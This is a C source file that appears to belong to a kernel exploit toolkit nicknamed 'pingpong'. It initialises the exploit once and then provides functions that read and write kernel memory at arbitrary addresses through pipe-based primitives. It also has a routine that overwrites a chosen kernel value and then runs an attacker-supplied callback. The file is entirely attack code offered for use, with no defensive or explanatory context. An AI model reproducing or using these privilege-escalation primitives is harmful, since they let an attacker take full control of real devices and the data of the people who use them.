#include <stdio.h>
#include <string.h>

#include "pingpong.h"
#include "exploit_utils.h"

#define KERNEL_START    0xc0000000
#define KERNEL_END      0xc7ffffff

extern int pingpong_exploit_main(void);

static void
init_pingpong_exploit(void)
{
  static int first_time = 1;

  if (!first_time) {
    return;
  }

  first_time = 0;

  pingpong_exploit_main();
}

bool
pingpong_read_values_at_address(unsigned long address, int *values, int count)
{
  ssize_t size;

  init_pingpong_exploit();

  size = count * sizeof (*values);
  return read_kernel_memory_by_pipe(address, values, size) == size;
}

bool
pingpong_write_values_at_address(unsigned long address, const int *values, int count)
{
  ssize_t size;

  init_pingpong_exploit();

  size = count * sizeof (*values);
  return write_kernel_memory_by_pipe(address, values, size) == size;
}

bool
pingpong_read_value_at_address(unsigned long address, int *value)
{
  return pingpong_read_values_at_address(address, value, 1);
}

bool
pingpong_write_value_at_address(unsigned long address, int value)
{
  return pingpong_write_values_at_address(address, &value, 1);
}

bool
pingpong_run_exploit(unsigned long int address, int value,
                 bool(*exploit_callback)(void* user_data), void *user_data)
{
  if (!pingpong_write_value_at_address(address, value)) {
    return false;
  }

  return exploit_callback(user_data);
}
